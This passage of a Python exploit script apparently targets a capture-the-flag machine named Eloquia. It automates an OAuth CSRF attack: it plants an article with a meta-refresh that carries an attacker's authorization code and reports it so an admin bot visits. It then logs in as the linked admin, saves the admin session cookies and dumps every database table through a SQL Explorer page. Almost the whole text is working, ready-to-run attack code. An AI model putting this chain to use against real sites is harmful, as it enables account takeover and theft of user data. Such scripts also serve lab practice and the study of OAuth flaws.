        data={'csrfmiddlewaretoken': csrf, 'username': username, 'password': password},
        headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"})

    if 'sessionid' not in eloquia_test.cookies:
        error("Cannot login to Eloquia for validation")
        return None

    # Login to Qooqle with main account
    qooqle_test = requests.Session()
    login_page = qooqle_test.get(f"{TARGET_QOOQLE}/login/")
    csrf = get_csrf(login_page.text)
    qooqle_test.post(f"{TARGET_QOOQLE}/login/",
        data={'csrfmiddlewaretoken': csrf, 'username': username, 'password': password},
        headers={'Referer': f"{TARGET_QOOQLE}/login/"})

    if 'sessionid' not in qooqle_test.cookies:
        error("Cannot login to Qooqle for validation")
        return None

    # Check current link status
    connect_page = eloquia_test.get(f"{TARGET_ELOQUIA}/accounts/connect/")
    current_link = re.search(r'Qooqle</td>\s*<td>([^<]+)</td>', connect_page.text)
    if current_link:
        info(f"Current link: {current_link.group(1)}")
    else:
        info("No current Qooqle link")

    # Do OAuth to link main account (or verify existing link)
    oauth_init = eloquia_test.get(f"{TARGET_ELOQUIA}/accounts/oauth2/qooqle/authorize/",
                                  allow_redirects=False)
    qooqle_auth_url = oauth_init.headers.get('Location', '')

    auth_page = qooqle_test.get(qooqle_auth_url)
    csrf = get_csrf(auth_page.text)
    if csrf:
        resp = qooqle_test.post(qooqle_auth_url,
            data={
                'csrfmiddlewaretoken': csrf,
                'redirect_uri': REDIRECT_URI,
                'scope': 'read write',
                'client_id': CLIENT_ID,
                'response_type': 'code',
                'allow': 'Authorize'
            },
            headers={'Referer': qooqle_auth_url},
            allow_redirects=False)
        callback_url = resp.headers.get('Location', '')
        eloquia_test.get(callback_url, allow_redirects=True)

    # Verify link was created
    connect_page = eloquia_test.get(f"{TARGET_ELOQUIA}/accounts/connect/")
    new_link = re.search(r'Qooqle</td>\s*<td>([^<]+)</td>', connect_page.text)
    if new_link:
        success(f"OAuth linking works! Linked: {new_link.group(1)}")
    else:
        warn("Could not verify OAuth link - proceeding anyway")

    # Now "unlink" by changing to a throwaway account
    # This ensures our main account won't interfere with the attack
    info("Creating throwaway account to clear link...")
    throwaway_suffix = ''.join(random.choices(string.ascii_lowercase, k=4))
    throwaway_user = f"tmp{throwaway_suffix}"
    # Password must be different enough from username to pass validation
    throwaway_pass = f"Thr0w{random.randint(1000,9999)}!"

    qooqle_throwaway = requests.Session()
    reg_page = qooqle_throwaway.get(f"{TARGET_QOOQLE}/register/")
    csrf = get_csrf(reg_page.text)
    qooqle_throwaway.post(f"{TARGET_QOOQLE}/register/",
        data={
            'csrfmiddlewaretoken': csrf,
            'first_name': 'Tmp', 'last_name': 'User',
            'username': throwaway_user,
            'password1': throwaway_pass, 'password2': throwaway_pass
        },
        headers={'Referer': f"{TARGET_QOOQLE}/register/"})

    login_page = qooqle_throwaway.get(f"{TARGET_QOOQLE}/login/")
    csrf = get_csrf(login_page.text)
    qooqle_throwaway.post(f"{TARGET_QOOQLE}/login/",
        data={'csrfmiddlewaretoken': csrf, 'username': throwaway_user, 'password': throwaway_pass},
        headers={'Referer': f"{TARGET_QOOQLE}/login/"})

    if 'sessionid' in qooqle_throwaway.cookies:
        # Use "Change" to switch link to throwaway
        oauth_init = eloquia_test.get(f"{TARGET_ELOQUIA}/accounts/oauth2/qooqle/authorize/",
                                      allow_redirects=False)
        qooqle_auth_url = oauth_init.headers.get('Location', '')
        auth_page = qooqle_throwaway.get(qooqle_auth_url)
        csrf = get_csrf(auth_page.text)
        if csrf:
            resp = qooqle_throwaway.post(qooqle_auth_url,
                data={
                    'csrfmiddlewaretoken': csrf,
                    'redirect_uri': REDIRECT_URI,
                    'scope': 'read write',
                    'client_id': CLIENT_ID,
                    'response_type': 'code',
                    'allow': 'Authorize'
                },
                headers={'Referer': qooqle_auth_url},
                allow_redirects=False)
            callback_url = resp.headers.get('Location', '')
            eloquia_test.get(callback_url, allow_redirects=True)

        # Verify link changed
        connect_page = eloquia_test.get(f"{TARGET_ELOQUIA}/accounts/connect/")
        final_link = re.search(r'Qooqle</td>\s*<td>([^<]+)</td>', connect_page.text)
        if final_link and throwaway_user in final_link.group(1):
            success(f"Link changed to throwaway: {final_link.group(1)}")
            success("Main account unlinked - ready for attack!")
        else:
            warn("Could not verify unlink - proceeding anyway")
    else:
        warn("Throwaway creation failed - main account may still be linked")

    # Step 2: Create fresh Qooqle-only attack account
    # This account must NOT exist on Eloquia to avoid link conflicts
    step(2, 6, "Creating fresh Qooqle-only attack account...")

    attack_suffix = ''.join(random.choices(string.ascii_lowercase, k=6))
    attack_user = f"atk{attack_suffix}"
    # Password must be different enough from username to pass validation
    attack_pass = f"Xpl0it{random.randint(1000,9999)}!"

    qooqle_attack = requests.Session()
    reg_page = qooqle_attack.get(f"{TARGET_QOOQLE}/register/")
    csrf = get_csrf(reg_page.text)

    qooqle_attack.post(f"{TARGET_QOOQLE}/register/",
        data={
            'csrfmiddlewaretoken': csrf,
            'first_name': 'Attack',
            'last_name': 'Account',
            'username': attack_user,
            'password1': attack_pass,
            'password2': attack_pass
        },
        headers={'Referer': f"{TARGET_QOOQLE}/register/"}
    )

    # Login to the attack account
    login_page = qooqle_attack.get(f"{TARGET_QOOQLE}/login/")
    csrf = get_csrf(login_page.text)
    qooqle_attack.post(f"{TARGET_QOOQLE}/login/",
        data={
            'csrfmiddlewaretoken': csrf,
            'username': attack_user,
            'password': attack_pass
        },
        headers={'Referer': f"{TARGET_QOOQLE}/login/"}
    )

    if 'sessionid' not in qooqle_attack.cookies:
        error(f"Failed to create/login attack account: {attack_user}")
        return None

    success(f"Attack account created: {attack_user} (Qooqle-only)")

    # Save attack credentials for takeover phase
    with open(os.path.join(TMP_DIR, "attack_user.txt"), "w") as f:
        f.write(attack_user)
    with open(os.path.join(TMP_DIR, "attack_pass.txt"), "w") as f:
        f.write(attack_pass)

    # Step 3: Generate OAuth code for attack account
    step(3, 6, "Generating OAuth code for attack account...")
    auth_url = f"{TARGET_QOOQLE}/oauth2/authorize/?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}"
    auth_page = qooqle_attack.get(auth_url)
    csrf = get_csrf(auth_page.text)

    resp = qooqle_attack.post(auth_url,
        data={
            'csrfmiddlewaretoken': csrf,
            'redirect_uri': REDIRECT_URI,
            'scope': 'read write',
            'client_id': CLIENT_ID,
            'response_type': 'code',
            'allow': 'Authorize'
        },
        headers={'Referer': auth_url},
        allow_redirects=False
    )

    location = resp.headers.get('Location', '')
    code_match = re.search(r'code=([^&\s]+)', location)

    if not code_match:
        error("Failed to get OAuth code")
        return None

    oauth_code = code_match.group(1)
    success(f"OAuth code for {attack_user}: {oauth_code[:16]}...")

    # Step 4: Login to Eloquia (use main account for article creation)
    step(4, 6, "Creating poisoned article on Eloquia...")
    eloquia = requests.Session()

    login_page = eloquia.get(f"{TARGET_ELOQUIA}/accounts/login/")
    csrf = get_csrf(login_page.text)
    eloquia.post(f"{TARGET_ELOQUIA}/accounts/login/",
        data={
            'csrfmiddlewaretoken': csrf,
            'username': username,
            'password': password
        },
        headers={'Referer': f"{TARGET_ELOQUIA}/accounts/login/"}
    )

    if 'sessionid' not in eloquia.cookies:
        error("Eloquia login failed")
        return None

    # Create malicious article with meta refresh to callback
    malicious_url = f"{REDIRECT_URI}?code={oauth_code}"
    timestamp = str(int(time.time()))
    content = f'<meta http-equiv="refresh" content="0;url={malicious_url}"><p>Security update.</p>'

    my_articles = eloquia.get(f"{TARGET_ELOQUIA}/article/mine/")
    existing_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))

    create_page = eloquia.get(f"{TARGET_ELOQUIA}/article/create/")
    csrf = get_csrf(create_page.text)

    resp = eloquia.post(f"{TARGET_ELOQUIA}/article/create/",
        data={
            'csrfmiddlewaretoken': csrf,
            'title': f"Update {timestamp}",
            'content': content
        },
        files={'banner': ('banner.png', create_banner_image(), 'image/png')},
        headers={'Referer': f"{TARGET_ELOQUIA}/article/create/"},
        timeout=60
    )

    article_id = None
    match = re.search(r'article/visit/(\d+)', resp.url + resp.text)
    if match:
        article_id = match.group(1)
    else:
        my_articles = eloquia.get(f"{TARGET_ELOQUIA}/article/mine/")
        new_ids = set(re.findall(r'article/visit/(\d+)', my_articles.text))
        created = new_ids - existing_ids
        if created:
            article_id = max(created)

    if not article_id:
        error("Failed to create exploit article")
        return None

    success(f"Exploit article created: ID {article_id}")
    info(f"Payload: <meta refresh> -> {malicious_url[:50]}...")

    # Step 5: Report article
    step(5, 6, "Reporting article to trigger admin bot...")
    eloquia.get(f"{TARGET_ELOQUIA}/article/report/{article_id}/")
    success("Article reported - admin bot will visit soon")

    # Step 6: Wait for bot
    step(6, 6, f"Waiting {POST_EXPLOIT_WAIT}s for admin bot to visit...")
    for i in range(POST_EXPLOIT_WAIT, 0, -1):
        print(f"\r  Waiting: {i}s  ", end='', flush=True)
        time.sleep(1)
    print("\r  Done!          ")

    # Save exploit info
    with open(os.path.join(TMP_DIR, "oauth_code.txt"), "w") as f:
        f.write(oauth_code)
    with open(os.path.join(TMP_DIR, "exploit_article_id.txt"), "w") as f:
        f.write(article_id)

    return qooqle_attack  # Return attack Qooqle session for login phase

# =============================================================================
# PHASE 5: ADMIN TAKEOVER
# =============================================================================

def phase_takeover(qooqle_attack_session):
    """
    Login as admin via OAuth using the attack account.

    After the admin bot visited our malicious article:
    - Admin's Eloquia account is now linked to our attack Qooqle identity
    - When we do OAuth login with attack account, Eloquia looks up linked account
    - It finds admin's account (the ONLY account linked to attack Qooqle)
    - We get logged in as admin!

    This works because:
    1. Attack account only exists on Qooqle (never on Eloquia)
    2. No prior links existed for this account
    3. Bot created the first/only link: admin@eloquia -> attack@qooqle
    """
    section("PHASE 5: ADMIN TAKEOVER",
            "Login as admin via OAuth (using attack account)")

    step(1, 2, "Initiating OAuth login flow...")

    # Start OAuth from Eloquia
    eloquia = requests.Session()
    oauth_init = eloquia.get(f"{TARGET_ELOQUIA}/accounts/oauth2/qooqle/authorize/",
                            allow_redirects=False)
    qooqle_auth_url = oauth_init.headers.get('Location', '')

    if 'qooqle' not in qooqle_auth_url:
        error("Unexpected OAuth redirect")
        return None

    # Authorize using our attack Qooqle session
    auth_page = qooqle_attack_session.get(qooqle_auth_url)
    csrf = get_csrf(auth_page.text)

    if not csrf:
        error("Could not get CSRF from Qooqle auth page")
        return None

    resp = qooqle_attack_session.post(qooqle_auth_url,
        data={
            'csrfmiddlewaretoken': csrf,
            'redirect_uri': REDIRECT_URI,
            'scope': 'read write',
            'client_id': CLIENT_ID,
            'response_type': 'code',
            'allow': 'Authorize'
        },
        headers={'Referer': qooqle_auth_url},
        allow_redirects=False
    )

    callback_url = resp.headers.get('Location', '')

    # Follow callback with Eloquia session
    step(2, 2, "Following OAuth callback...")
    resp = eloquia.get(callback_url, allow_redirects=True)

    if 'sessionid' not in eloquia.cookies:
        error("No session obtained")
        warn("The admin may not have visited the article yet")
        warn("Or the OAuth code expired")
        return None

    success("Got Eloquia session!")

    # Check who we are
    profile = eloquia.get(f"{TARGET_ELOQUIA}/accounts/profile/")
    username_match = re.search(r'value="([^"]+)"[^>]*id="id_username"', profile.text)
    if not username_match:
        username_match = re.search(r'Howdy,\s*(\w+)', profile.text)

    if username_match:
        logged_in_as = username_match.group(1)

        if 'admin' in logged_in_as.lower():
            print()
            success("ADMIN ACCESS CONFIRMED!")
            info(f"Logged in as: {logged_in_as}")

            # Save admin cookies
            cookie_file = os.path.join(TMP_DIR, "admin_cookies.txt")
            with open(cookie_file, "w") as f:
                for cookie in eloquia.cookies:
                    f.write(f"{cookie.name}={cookie.value}\n")
            success(f"Admin cookies saved to: {cookie_file}")

            return eloquia
        else:
            warn(f"Logged in as: {logged_in_as} (not admin)")
            return eloquia
    else:
        warn("Could not determine username")
        return eloquia

# =============================================================================
# PHASE 6: POST-EXPLOITATION
# =============================================================================

def phase_post_exploit(admin_session):
    """
    Explore admin access and identify next steps.

    With admin access we can:
    1. Access Django admin panel
    2. Use SQL Explorer for database queries
    3. Manage users, articles, etc.
    """
    section("PHASE 6: POST-EXPLOITATION",
            "Explore admin capabilities")

    step(1, 3, "Checking admin panel access...")
    admin_page = admin_session.get(f"{TARGET_ELOQUIA}/accounts/admin/")
    if 'Site administration' in admin_page.text:
        success("Admin panel accessible at /accounts/admin/")

    step(2, 3, "Checking SQL Explorer access...")
    sql_page = admin_session.get(f"{TARGET_ELOQUIA}/dev/sql-explorer/")
    if 'SQL Explorer' in sql_page.text:
        success("SQL Explorer accessible at /dev/sql-explorer/")
        info("Can run arbitrary SQL queries against the database")

    step(3, 3, "Checking for flags...")
    # Check profile for flag
    profile = admin_session.get(f"{TARGET_ELOQUIA}/accounts/profile/")
    if 'HTB{' in profile.text:
        flag = re.search(r'HTB\{[^}]+\}', profile.text)
        if flag:
            print()
            print(f"{C.G}{C.BOLD}  FLAG FOUND: {flag.group(0)}{C.X}")

    print()
    print(f"{C.C}Available endpoints:{C.X}")
    print(f"  - Admin Panel:  {TARGET_ELOQUIA}/accounts/admin/")
    print(f"  - SQL Explorer: {TARGET_ELOQUIA}/dev/sql-explorer/play/")
    print(f"  - Profile:      {TARGET_ELOQUIA}/accounts/profile/")

# =============================================================================
# PHASE 7: DATABASE EXTRACTION
# =============================================================================

def phase_extract_database(admin_session):
    """
    Extract the entire SQLite database via SQL Explorer.

    SQL Explorer at /dev/sql-explorer/play/ allows arbitrary SQL queries.
    We enumerate all tables and dump their contents to files.
    """
    section("PHASE 7: DATABASE EXTRACTION",
            "Download all database tables via SQL Explorer")

    SQL_EXPLORER_URL = f"{TARGET_ELOQUIA}/dev/sql-explorer/play/"
    DB_DIR = os.path.join(TMP_DIR, "database")
    os.makedirs(DB_DIR, exist_ok=True)

    def run_sql(session, query):
        """Execute SQL query and return results"""
        # Get CSRF token
        page = session.get(SQL_EXPLORER_URL)
        csrf = get_csrf(page.text)
        if not csrf:
            # Try alternate CSRF extraction
            csrf_match = re.search(r'csrfmiddlewaretoken[\'\"]\s*:\s*[\'"]([^"\']+)[\'"]', page.text)
            if csrf_match:
                csrf = csrf_match.group(1)

        if not csrf:
            return None, "Could not get CSRF token"

        # Submit query
        resp = session.post(SQL_EXPLORER_URL,
            data={
                'csrfmiddlewaretoken': csrf,
                'sql': query
            },
            headers={'Referer': SQL_EXPLORER_URL}
        )

        return resp.text, None

    def parse_table_html(html):
        """Extract table data from SQL Explorer HTML response"""
        rows = []
        headers = []

        # SQL Explorer uses specific structure:
        # <thead class="data-headers"> ... <th class="preview-header">name</th> ...
        # <tbody class="list"> <tr class="data-row"> <td class="0">value</td> ...

        # Extract headers from preview-header class
        header_pattern = re.compile(r'<th[^>]*class="preview-header"[^>]*>.*?</i>([^<]+)</span>', re.DOTALL)
        header_matches = header_pattern.findall(html)
        if header_matches:
            headers = [h.strip() for h in header_matches]
        else:
            # Fallback: try simpler header extraction
            header_pattern2 = re.compile(r'<th[^>]*>([^<]+)</th>')
            headers = [h.strip() for h in header_pattern2.findall(html) if h.strip()]

        # Extract data rows - look for tr with class="data-row"
        row_pattern = re.compile(r'<tr[^>]*class="data-row"[^>]*>(.*?)</tr>', re.DOTALL)
        cell_pattern = re.compile(r'<td[^>]*>([^<]*)</td>', re.DOTALL)

        for row_match in row_pattern.finditer(html):
            row_html = row_match.group(1)
            cells = cell_pattern.findall(row_html)
            if cells:
                # Skip the first cell if it's just a counter (hidden column)
                cleaned = []
                for i, cell in enumerate(cells):
                    cell = cell.strip()
                    # Skip hidden counter cells (they're just indices)
                    if i == 0 and cell.isdigit():
                        continue
                    # Unescape HTML entities
                    cell = cell.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&').replace('&quot;', '"')
                    cleaned.append(cell)
                if cleaned:
                    rows.append(cleaned)

        return headers, rows

    # Step 1: Get list of all tables
    step(1, 3, "Enumerating database tables...")

    result, err = run_sql(admin_session,
        "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name;")

    if err:
        error(f"SQL query failed: {err}")
        return

    # Save raw response for debugging
    with open(os.path.join(DB_DIR, "_tables_response.html"), "w") as f:
        f.write(result if result else "")

    headers, rows = parse_table_html(result)
    tables = [row[0] for row in rows if row]

    # Validate table names - should be actual names not numbers
    valid_tables = [t for t in tables if not t.isdigit() and len(t) > 0]
    if not valid_tables and tables:
        warn(f"Parsed {len(tables)} entries but they look like indices, not table names")
        info("Saving raw HTML for debugging: _tables_response.html")
        info("The SQL Explorer may use a different HTML structure")
        # Try alternative parsing - look for table names in the response
        alt_tables = re.findall(r'(?:Eloquia_\w+|django_\w+|auth_\w+|oauth2_\w+)', result)
        if alt_tables:
            tables = list(set(alt_tables))
            success(f"Found tables via alternate parsing: {', '.join(tables)}")
        else:
            return
    elif not tables:
        error("No tables found in response")
        info("Check _tables_response.html for the actual format")
        return
    else:
        tables = valid_tables

    success(f"Found {len(tables)} tables: {', '.join(tables)}")

    # Step 2: Dump each table
    step(2, 3, "Extracting table data...")

    all_data = {}

    for table_name in tables:
        # Skip Django internal tables if needed
        info(f"  Dumping: {table_name}")

        # Get schema
        schema_result, _ = run_sql(admin_session,
            f"PRAGMA table_info({table_name});")

        # Get all data
        data_result, _ = run_sql(admin_session,
            f"SELECT * FROM {table_name};")

        headers, rows = parse_table_html(data_result)

        # Save to CSV
        csv_file = os.path.join(DB_DIR, f"{table_name}.csv")
        with open(csv_file, "w") as f:
            if headers:
                f.write(",".join(f'"{h}"' for h in headers) + "\n")
            for row in rows:
                f.write(",".join(f'"{c}"' for c in row) + "\n")

        all_data[table_name] = {
            "headers": headers,
            "rows": rows,
            "count": len(rows)
        }

        print(f"      -> {len(rows)} rows saved to {table_name}.csv")

    # Step 3: Save summary and look for interesting data
    step(3, 3, "Analyzing extracted data...")

    # Save JSON summary
    summary_file = os.path.join(DB_DIR, "_summary.json")
    with open(summary_file, "w") as f:
        summary = {table: {"columns": data["headers"], "row_count": data["count"]}
                   for table, data in all_data.items()}
        json.dump(summary, indent=2, fp=f)

    success(f"Database dump saved to: {DB_DIR}/")

    # Look for interesting data
    print(f"\n{C.C}Interesting findings:{C.X}")

    # Check for users table
    for table in ['Eloquia_customuser', 'auth_user', 'users']:
        if table in all_data and all_data[table]["rows"]:
            print(f"  - {table}: {all_data[table]['count']} users")
            # Show usernames
            headers = all_data[table]["headers"]
            if headers:
                username_idx = None
                for i, h in enumerate(headers):
                    if 'username' in h.lower():
                        username_idx = i
                        break
                if username_idx is not None:
                    usernames = [row[username_idx] for row in all_data[table]["rows"][:5]]
                    print(f"    Users: {', '.join(usernames)}")

    # Look for flags or secrets
    for table, data in all_data.items():
        for row in data["rows"]:
            for cell in row:
                if 'HTB{' in str(cell):
                    flag_match = re.search(r'HTB\{[^}]+\}', str(cell))
                    if flag_match:
                        print(f"\n{C.G}{C.BOLD}  FLAG FOUND in {table}: {flag_match.group(0)}{C.X}")
                if any(kw in str(cell).lower() for kw in ['password', 'secret', 'key', 'token']):
                    print(f"  - Potential secret in {table}: {str(cell)[:50]}...")

    # Additional useful queries
    print(f"\n{C.C}Additional SQL queries to try:{C.X}")
    print(f"  SELECT * FROM Eloquia_customuser WHERE is_superuser=1;")
    print(f"  SELECT username, email, qooqle_connected_account FROM Eloquia_customuser;")
    print(f"  SELECT sql FROM sqlite_master WHERE type='table';")

# =============================================================================
# MAIN
# =============================================================================

def run_single_phase(phase_num, args):
    """
    Run a single phase with its prerequisites loaded from saved state.
    Returns True on success, False on failure.
    """
    global TARGET_IP

    # Handle target IP for single-phase runs too
    if hasattr(args, 'target') and args.target:
        TARGET_IP = args.target
    elif not TARGET_IP:
        TARGET_IP = get_hosts_ip()
        if not TARGET_IP:
            fatal("No target IP specified. Use --target <IP>")

    ensure_dirs()

    phase_names = {
        1: "SETUP",
        2: "REGISTRATION",
        3: "CALIBRATION",
        4: "EXPLOIT",
        5: "TAKEOVER",
        6: "POST-EXPLOIT",
        7: "DB EXTRACT"
    }

    print(f"\n{C.C}{C.BOLD}Running Phase {phase_num}: {phase_names.get(phase_num, 'UNKNOWN')}{C.X}\n")

    # Phase 1: Setup - no prerequisites
    if phase_num == 1:
        return phase_setup(skip=False)

    # Phase 2: Registration - no prerequisites (but needs hosts)
    elif phase_num == 2:
        username, password = phase_register(new_user=True, skip=False)
        return username is not None

    # Phase 3: Calibration - needs credentials and callback IP
    elif phase_num == 3:
        username, password = load_credentials()
        if not username:
            error("No credentials found. Run phase 2 first.")
            return False
        callback_ip = get_tun0_ip()
        if not callback_ip:
            error("Could not get tun0 IP. Check VPN connection.")
            return False
        info(f"Using credentials: {username}")
        info(f"Callback IP: {callback_ip}")
        bot_time, _ = phase_calibrate(username, password, callback_ip)
        return bot_time is not None

    # Phase 4: Exploit - needs credentials (runs immediately, no timing wait)
    elif phase_num == 4:
        username, password = load_credentials()
        if not username:
            error("No credentials found. Run phase 2 first.")
            return False
        info(f"Using credentials: {username}")
        # Use current time as "bot time" to run immediately
        qooqle_session = phase_exploit(username, password, time.time())
        return qooqle_session is not None

    # Phase 5: Takeover - needs Qooqle session
    elif phase_num == 5:
        username, password = load_credentials()
        if not username:
            error("No credentials found. Run phase 2 first.")
            return False
        info(f"Using credentials: {username}")
        qooqle_session = load_qooqle_session(username, password)
        if not qooqle_session:
            error("Could not login to Qooqle")
            return False
        success("Logged into Qooqle")
        admin_session = phase_takeover(qooqle_session)
        return admin_session is not None

    # Phase 6: Post-exploit - needs admin session
    elif phase_num == 6:
        admin_session = load_admin_session()
        if not admin_session:
            error("No valid admin session found.")
            error("Run full exploit or ensure tmp/admin_cookies.txt exists.")
            return False
        success("Loaded admin session from cookies")
        phase_post_exploit(admin_session)
        return True

    # Phase 7: DB Extract - needs admin session
    elif phase_num == 7:
        admin_session = load_admin_session()
        if not admin_session:
            error("No valid admin session found.")
            error("Run full exploit or ensure tmp/admin_cookies.txt exists.")
            return False
        success("Loaded admin session from cookies")
        phase_extract_database(admin_session)
        return True

    else:
        error(f"Unknown phase: {phase_num}")
        return False


def main():
    global BOT_INTERVAL, CAPTURE_PORT, TARGET_IP

    parser = argparse.ArgumentParser(
        description='Eloquia OAuth CSRF Exploit - Automated attack chain',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{C.C}EXAMPLES{C.X}
  python3 lab_exploit.py -t 10.129.21.16  # Full exploit with new IP
  python3 lab_exploit.py --keep-data      # Reuse existing credentials
  python3 lab_exploit.py --run-phase 7    # Extract database only
  python3 lab_exploit.py --run-phase 2    # Register accounts only
  python3 lab_exploit.py --phases         # Show detailed phase info

{C.C}PHASES{C.X}
  1: SETUP         Configure /etc/hosts
  2: REGISTRATION  Create attacker accounts
  3: CALIBRATION   Measure admin bot timing
  4: EXPLOIT       Create poisoned OAuth article
  5: TAKEOVER      Login as admin via OAuth
  6: POST-EXPLOIT  Verify admin access
  7: DB EXTRACT    Download database via SQL Explorer

{C.C}FILES{C.X}
  tmp/admin_cookies.txt  Admin session (needed for phases 6-7)
  tmp/database/          Extracted database tables
        """
    )

    # Mode selection
    parser.add_argument('--run-phase', type=int, metavar='N', choices=range(1, 8),
                        help='Run only phase N (1-7). Loads saved state as needed.')
    parser.add_argument('--phases', action='store_true',
                        help='Show detailed information about each phase')

    # Target
    parser.add_argument('--target', '-t', metavar='IP',
                        help='Target IP address (REQUIRED unless already in /etc/hosts)')

    # Configuration
    parser.add_argument('--skip-setup', action='store_true',
                        help='Skip Phase 1 (hosts configuration)')
    parser.add_argument('--keep-data', action='store_true',
                        help='Keep existing tmp/ data, reuse credentials')
    parser.add_argument('--skip-db', action='store_true',
                        help='Skip Phase 7 (database extraction)')
    parser.add_argument('--use-timing', action='store_true',
                        help='Load BOT_INTERVAL from bot_timing.py data (tmp/bot_timing.json)')
    parser.add_argument('--collect-timing', type=int, metavar='N', default=0,
                        help='Collect N timing samples before exploit (implies --use-timing)')

    # Timing
    parser.add_argument('--bot-interval', type=int, default=181, metavar='SEC',
                        help='Bot visit interval in seconds (default: 181)')
    parser.add_argument('--lead-time', type=int, default=25, metavar='SEC',
                        help='Generate OAuth code N seconds before predicted bot visit (default: 25)')
    parser.add_argument('--port', type=int, default=8888, metavar='PORT',
                        help='Capture server starting port (default: 8888)')

    args = parser.parse_args()

    # Show phase help if requested
    if args.phases:
        print_phase_help()
        return

    # Update config from args
    BOT_INTERVAL = args.bot_interval
    EXPLOIT_LEAD_TIME = args.lead_time
    CAPTURE_PORT = args.port

    # Handle target IP
    if args.target:
        TARGET_IP = args.target
    else:
        # Try to get from /etc/hosts
        TARGET_IP = get_hosts_ip()
        if not TARGET_IP:
            fatal("No target IP specified.\n"
                  f"  Use: python3 {sys.argv[0]} --target <IP>\n"
                  f"  Example: python3 {sys.argv[0]} --target 10.129.21.16")

    # Run single phase if requested
    if args.run_phase:
        banner()
        success_flag = run_single_phase(args.run_phase, args)
        if success_flag:
            print(f"\n{C.G}Phase {args.run_phase} completed successfully{C.X}")
        else:
            print(f"\n{C.R}Phase {args.run_phase} failed{C.X}")
            sys.exit(1)
        return

    banner()

    # By default: clear tmp and start fresh
    if args.keep_data:
        info("Keeping existing data (--keep-data)")
        ensure_dirs()
    else:
        info("Fresh start: clearing tmp folder")
        clear_tmp()

    # Get callback IP
    callback_ip = get_tun0_ip()
    if not callback_ip:
        error("Could not determine tun0 IP address")
        error("Make sure VPN is connected")
        sys.exit(1)
    info(f"Callback IP (tun0): {callback_ip}")

    # Phase 1: Setup
    if not phase_setup(skip=args.skip_setup):
        error("Setup failed")
        sys.exit(1)

    # Phase 2: Registration
    # By default creates new user; --keep-data tries to reuse existing
    username, password = phase_register(
        new_user=not args.keep_data,
        skip=False
    )
    if not username:
        error("Registration failed")
        sys.exit(1)

    # If --collect-timing, collect timing samples now
    if args.collect_timing > 0:
        collected = phase_collect_timing(username, password, callback_ip, args.collect_timing)
        if not collected:
            error("Timing collection failed")
            sys.exit(1)
        # Implicitly enable --use-timing
        args.use_timing = True

    # If --use-timing, load BOT_INTERVAL from timing data (unless --bot-interval was explicitly set)
    if args.use_timing:
        timing = load_bot_timing()
        if not timing:
            error("No timing data found in tmp/bot_timing.json")
            error("Run bot_timing.py first to collect data, or omit --use-timing")
            sys.exit(1)

        # Only override if user didn't explicitly set --bot-interval
        if args.bot_interval == 181:  # Default value
            BOT_INTERVAL = int(timing["interval_avg"])
            info(f"Loaded timing data: BOT_INTERVAL={BOT_INTERVAL}s "
                 f"(from {timing['samples']} samples, range {timing['interval_min']}-{timing['interval_max']}s)")
        else:
            info(f"Using explicit --bot-interval={BOT_INTERVAL}s (timing data available but overridden)")

    # Phase 3: Timing Calibration
    bot_time, used_port = phase_calibrate(username, password, callback_ip)
    if not bot_time:
        error("Calibration failed")
        sys.exit(1)

    # Phase 4: Exploit
    qooqle_session = phase_exploit(username, password, bot_time)
    if not qooqle_session:
        error("Exploit failed")
        sys.exit(1)

    # Phase 5: Admin Takeover
    admin_session = phase_takeover(qooqle_session)
    if not admin_session:
        error("Takeover failed")
        warn("Try running again - timing may have been off")
        sys.exit(1)

    # Phase 6: Post-Exploitation
    phase_post_exploit(admin_session)

    # Phase 7: Database Extraction
    if not args.skip_db:
        phase_extract_database(admin_session)
    else:
        info("Skipping database extraction (--skip-db)")

    # Summary
    section("EXPLOIT COMPLETE")
    print(f"{C.G}Successfully obtained admin access to Eloquia!{C.X}")
    print()
    print(f"Saved files:")
    print(f"  Admin cookies: {TMP_DIR}/admin_cookies.txt")
    if not args.skip_db:
        print(f"  Database dump: {TMP_DIR}/database/")
    print()
    print(f"Use cookies with:")
    print(f"  curl -b \"$(cat {TMP_DIR}/admin_cookies.txt | tr '\\n' ';')\" <url>")
    print()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.X}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{C.R}[!] Error: {e}{C.X}")
        raise
